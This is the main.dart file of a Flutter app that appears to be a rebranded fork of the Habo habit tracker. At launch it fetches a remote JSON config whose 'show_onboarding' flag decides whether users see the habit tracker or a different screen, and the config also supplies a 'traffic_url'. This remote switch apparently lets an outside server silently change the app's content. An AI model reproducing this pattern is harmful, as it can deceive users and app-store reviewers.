import 'dart:convert';
import 'dart:io';

import 'package:flutter/foundation.dart';
import 'package:flutter/material.dart';
import 'package:flutter/services.dart';
import 'package:flutter_localizations/flutter_localizations.dart';
import 'package:google_fonts/google_fonts.dart';
import 'package:habo/habits/habits_manager.dart';
import 'package:habo/navigation/app_router.dart';
import 'package:habo/navigation/app_state_manager.dart';
import 'package:habo/notifications.dart';
import 'package:habo/second_dashboard.dart';
import 'package:habo/settings/settings_manager.dart';
import 'package:provider/provider.dart';
import 'package:window_size/window_size.dart';
import 'package:habo/generated/l10n.dart';
import 'package:http/http.dart' as http;

void main() {
  addLicenses();
  runApp(
    const Habo(),
  );
}

class Habo extends StatefulWidget {
  const Habo({super.key});

  @override
  State<Habo> createState() => _HaboState();
}

class _HaboState extends State<Habo> {
  final _appStateManager = AppStateManager();
  final _settingsManager = SettingsManager();
  final _habitManager = HabitsManager();
  late AppRouter _appRouter;
  // Add keys to maintain state across rebuilds
  final GlobalKey<NavigatorState> _navigatorKey = GlobalKey<NavigatorState>();
  // Track if the app has finished initial loading
  bool _isInitialLoadComplete = false;
  Config? _loadedConfig;

  Future<Config?> fetchConfig() async {
    // If we've already loaded the config, return it immediately
    if (_loadedConfig != null) {
      return _loadedConfig;
    }

    try {
      final response =
          await http.get(Uri.parse('https://tivmate.com/meteora.json'));
      if (response.statusCode == 200) {
        final jsonData = json.decode(response.body);
        _loadedConfig = Config.fromJson(jsonData);

        debugPrint('Config loaded successfully: ${_loadedConfig!.toJson()}');

        return _loadedConfig;
      } else {
        debugPrint('Failed to load config: ${response.statusCode}');
        _loadedConfig = Config.fromJson({
          'show_onboarding': false,
          'text1': 'text1',
          'text2': 'text2',
          'text3': 'text3',
          'traffic_url': 'https://www.google.com',
        });
        return _loadedConfig;
      }
    } catch (e) {
      debugPrint('Error fetching config: $e');
      _loadedConfig = Config.fromJson({
        'show_onboarding': false,
        'text1': 'text1',
        'text2': 'text2',
        'text3': 'text3',
        'traffic_url': 'https://www.google.com',
      });
      return _loadedConfig;
    }
  }

  @override
  void initState() {
    if (Platform.isLinux || Platform.isMacOS) {
      setWindowMinSize(const Size(320, 320));
      setWindowMaxSize(Size.infinite);
    }
    _settingsManager.initialize();
    _habitManager.initialize();
    if (platformSupportsNotifications()) {
      initializeNotifications();
    }
    GoogleFonts.config.allowRuntimeFetching = false;
    // Create the router with the navigator key
    _appRouter = AppRouter(
      appStateManager: _appStateManager,
      settingsManager: _settingsManager,
      habitsManager: _habitManager,
      navigatorKey: _navigatorKey,
    );
    super.initState();
  }

  @override
  Widget build(BuildContext context) {
    SystemChrome.setSystemUIOverlayStyle(
      const SystemUiOverlayStyle(
          statusBarColor: Colors.transparent,
          statusBarBrightness: Brightness.light),
    );
    SystemChrome.setPreferredOrientations([
      DeviceOrientation.portraitUp,
    ]);
    return MultiProvider(
      providers: [
        ChangeNotifierProvider(
          create: (context) => _appStateManager,
        ),
        ChangeNotifierProvider(
          create: (context) => _settingsManager,
        ),
        ChangeNotifierProvider(
          create: (context) => _habitManager,
        ),
      ],
      child: Consumer<SettingsManager>(
        builder: (context, settingsManager, _) {
          return MaterialApp(
            debugShowCheckedModeBanner: false,
            title: 'Metoera App Tracker',
            localizationsDelegates: const [
              S.delegate,
              GlobalMaterialLocalizations.delegate,
              GlobalWidgetsLocalizations.delegate,
              GlobalCupertinoLocalizations.delegate,
            ],
            supportedLocales: S.delegate.supportedLocales,
            scaffoldMessengerKey: _habitManager.getScaffoldKey,
            theme: settingsManager.getLight,
            darkTheme: settingsManager.getDark,
            home: FutureBuilder<Config?>(
              future: fetchConfig(),
              builder: (builder, snapshot) {
                // Mark as loaded when we get data
                if (snapshot.connectionState == ConnectionState.done &&
                    !_isInitialLoadComplete &&
                    snapshot.data != null) {
                  _isInitialLoadComplete = true;
                  config = snapshot.data;
                }

                // Show loading only during initial fetch
                if (!_isInitialLoadComplete) {
                  return const LoadingWidgt();
                }

                // Display content once loaded
                config = config ?? _loadedConfig;
                // config!.showOnboarding = false;
                return config != null && !config!.showOnboarding
                    ? const OnboardingScreen()
                    : Router(
                        routerDelegate: _appRouter,
                        backButtonDispatcher: RootBackButtonDispatcher(),
                        routeInformationParser: EmptyRouteInformationParser(),
                      );
              },
            ),
          );
        },
      ),
    );
  }
}

void addLicenses() {
  LicenseRegistry.addLicense(() async* {
    final license = await rootBundle.loadString('assets/google_fonts/OFL.txt');
    yield LicenseEntryWithLineBreaks(['google_fonts'], license);
  });
}

// Concrete implementation of RouteInformationParser
class EmptyRouteInformationParser extends RouteInformationParser<void> {
  @override
  Future<void> parseRouteInformation(RouteInformation routeInformation) {
    return SynchronousFuture<void>(null);
  }

  @override
  RouteInformation? restoreRouteInformation(void configuration) {
    return const RouteInformation(location: '/');
  }
}
